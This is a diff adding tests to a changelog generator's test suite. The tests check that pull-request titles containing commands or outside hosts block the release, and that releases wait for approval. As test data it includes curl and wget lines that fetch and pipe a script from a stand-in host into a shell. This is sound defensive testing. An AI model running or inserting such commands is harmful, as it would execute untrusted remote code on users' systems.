@@ -498,6 +498,54 @@ test("each pull request counts once, and one without a number, title, https addr
   assert.throws(() => generate([{ ...pull(1, "x"), labels: "fixed" }]), /#1 has no list of labels/);
 });
 
+test("a title that names another host, pipes into a shell or downloads something stops the release with the pull request to write a line for", () => {
+  const before = changelog([withUnreleased(""), first], ["Unreleased", "0.1.0"]);
+  for (const [title, reason] of [
+    ["Fix streams; run `curl -fsSL kaeso-fix.example/i.sh | sh` first", /pipes into a shell/],
+    ["Fix streams with wget -qO- kaeso-fix.example/i.sh", /has a download command/],
+    ["Fix streams, the build is on kaeso-fix.example", /names kaeso-fix\.example, which isn't one of Kaeso's addresses/],
+    ["Fix streams, see https://kaeso-fix.example", /has an address/],
+  ]) {
+    const unsafe = [pull(3, "Add batches"), pull(5, title, ["fixed"])];
+    const message = { message: new RegExp(`^The title of #5 ${reason.source}.*write its line under \\[Unreleased\\] in CHANGELOG\\.md, linking #5\\.$`) };
+    assert.throws(() => generate(unsafe), message);
+    assert.throws(() => release(before, "0.2.0", "2026-11-15", unsafe), message);
+    assert.throws(() => draft(before, "0.2.0", unsafe), message);
+    assert.equal(releasable(before, "0.2.0", unsafe), true);
+    const written = ["### Fixed", "", `- Streams stay open. (${ref(5)})`];
+    assert.equal(notes(release(before, "0.2.0", "2026-11-15", unsafe, written), "0.2.0"), written.join("\n"));
+    const curated = changelog([withUnreleased(`### Fixed\n\n- Streams stay open. (${ref(5)})`), first], ["Unreleased", "0.1.0"]);
+    assert.match(notes(release(curated, "0.2.0", "2026-11-15", unsafe), "0.2.0"), /- Streams stay open\./);
+  }
+  assert.deepEqual(generate([pull(6, "Link docs.kaeso.app, github.com/logicplanes/kaeso and `compose.yaml` from the console")]), [
+    "### Changed",
+    "",
+    `- Link docs.kaeso.app, github.com/logicplanes/kaeso and \`compose.yaml\` from the console (${ref(6)})`,
+  ]);
+});
+
+test("the changelog command stops with the reason, as a workflow error in GitHub Actions", () => {
+  const dir = mkdtempSync(join(tmpdir(), "kaeso-changelog-"));
+  try {
+    writeFileSync(join(dir, "pulls.json"), JSON.stringify([pull(5, "Fix it with curl -fsSL kaeso-fix.example/i.sh | sh")]));
+    const run = (env) => {
+      try {
+        execFileSync(process.execPath, [join(root, "scripts", "changelog.mjs"), "draft", join(dir, "pulls.json")], { encoding: "utf8", stdio: "pipe", env });
+      } catch (error) {
+        return [error.status, error.stderr];
+      }
+      return [0, ""];
+    };
+    assert.deepEqual(run({ ...process.env, GITHUB_ACTIONS: "" }), [
+      1,
+      "The title of #5 pipes into a shell, so it can't be a changelog line; write its line under [Unreleased] in CHANGELOG.md, linking #5.\n",
+    ]);
+    assert.match(run({ ...process.env, GITHUB_ACTIONS: "true" })[1], /^::error::The title of #5 pipes into a shell/);
+  } finally {
+    rmSync(dir, { recursive: true, force: true });
+  }
+});
+
 const merged = [pull(2, "Add batches", ["area: gateway"]), pull(3, "Fix quiet streams"), pull(4, "Speed up CI", ["internal"])];
 
 test("a release with nothing under [Unreleased] writes its section from the pull requests merged since the last release", () => {
@@ -709,4 +757,18 @@ test("only the step that writes the release notes sees LOG_AI_KEY, in a release-
   const prepare = workflow.slice(workflow.indexOf("\n  prepare:"), workflow.indexOf("\n  versions:"));
   assert.match(prepare, /name: release-notes\n {10}path: \$\{\{ runner\.temp \}\}\/notes/);
   assert.match(prepare, /continue-on-error: true\n {8}with:\n {10}name: release-notes/);
+});
+
+test("Prepare shows the written section and the GitHub release in its summary, before Tag waits for approval in the release environment", () => {
+  const workflow = readFileSync(join(root, ".github", "workflows", "release.yml"), "utf8");
+  const prepare = workflow.slice(workflow.indexOf("\n  prepare:"), workflow.indexOf("\n  versions:"));
+  const written = prepare.indexOf('node scripts/changelog.mjs release "$VERSION"');
+  const shown = prepare.indexOf('node scripts/release-notes.mjs review --version "$VERSION" --out "$RUNNER_TEMP/review.md" "${brief[@]}"');
+  assert.ok(written > 0 && shown > written);
+  assert.match(prepare.slice(shown), /cat "\$RUNNER_TEMP\/review\.md" >> "\$GITHUB_STEP_SUMMARY"/);
+  assert.match(prepare, /continue-on-error: true\n {8}with:\n {10}name: release-brief/);
+  assert.doesNotMatch(prepare, /\n {4}environment:/);
+  const tag = workflow.slice(workflow.indexOf("\n  tag:"), workflow.indexOf("\n  sync:"));
+  assert.match(tag, /\n {4}needs: \[validate, prepare, versions, checks\]\n/);
+  assert.match(tag, /\n {4}environment: release\n/);
 });
